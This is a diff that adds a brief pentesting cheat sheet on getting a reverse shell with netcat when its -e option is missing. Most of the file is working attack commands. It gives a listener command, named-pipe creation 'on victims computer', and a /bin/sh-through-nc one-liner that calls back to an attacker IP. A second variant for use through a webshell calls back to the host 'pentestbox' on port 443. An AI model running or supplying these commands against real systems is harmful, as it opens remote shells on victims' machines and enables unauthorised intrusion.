@@ -1,0 +1,26 @@
+// If netcat doesn't have -e command enabled (wasn't compiled with the -DGAPING_SECURITY_HOLE command)
+// Got this idea from https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem
+
+// On your system
+
+nc -l PORT_NUMBER
+
+// On victims computer
+// Make a named pipe
+// On some linux systems
+
+mknod /tmp/backpipe p 
+
+// On MacOS
+
+mkfifo /tmp/backpipe
+
+// Then execute the following command
+
+/bin/sh 0</tmp/backpipe | nc YOUR_MACHINE_IP PORT_ON_WHICH_NC_IS_LISTENING 1>/tmp/backpipe
+
+// In case you are using a exection medium like a webshell, then use
+
+/bin/sh -c "/bin/sh 0</tmp/backpipe | nc pentestbox 443 1>/tmp/backpipe"
+
+
